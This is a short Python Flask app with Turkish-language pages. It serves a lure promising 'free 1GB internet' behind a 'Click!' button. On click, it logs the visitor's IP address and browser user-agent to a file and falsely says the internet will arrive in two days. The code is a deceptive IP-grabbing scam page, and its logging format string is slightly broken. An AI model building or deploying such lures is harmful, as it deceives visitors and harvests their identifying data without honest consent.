from flask import Flask, request, render_template_string
import logging

app = Flask(__name__)

# Logger yapılandırması
logging.basicConfig(
    filename='ip.log',
    level=logging.INFO,
    format='%(asctime)s - IP: %(message)s - Tarayıcı: %(message)s'
)

# Ana sayfa için HTML içeriği
INDEX_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Bedava 1GB İnternet</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Bedava 1GB İnternet</h1>
    <form action="/collect-data" method="post">
        <button type="submit">Tıkla!</button>
    </form>
</body>
</html>
"""

# Toplanan bilgileri göstermek için HTML şablonu
DATA_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>1GB Aldın!</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        ul { list-style: none; padding: 0; }
        li { padding: 8px 0; }
        strong { color: #555; }
    </style>
</head>
<body>
    <h1>Verileriniz Alındı.</h1>
    <h2>2 Gün İçinde Gelecektir Sabırlı Olun.<h2>
    <ul>
        <li><strong>IP Adresi:</strong> {{ ip_address }}</li>
        <li><strong>Tarayıcı:</strong> {{ user_agent }}</li>
    </ul>
</body>
</html>
"""

@app.route('/')
def index():
    """Verileriniz Alındı."""
    return render_template_string(INDEX_HTML)

@app.route('/collect-data', methods=['POST'])
def collect_data():
    """Verileriniz Alındı."""
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Toplanan verileri .log dosyasına yaz
    logging.info(f"IP Adresi: {ip_address}, Tarayıcı: {user_agent}")

    return render_template_string(DATA_HTML, ip_address=ip_address, user_agent=user_agent)

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
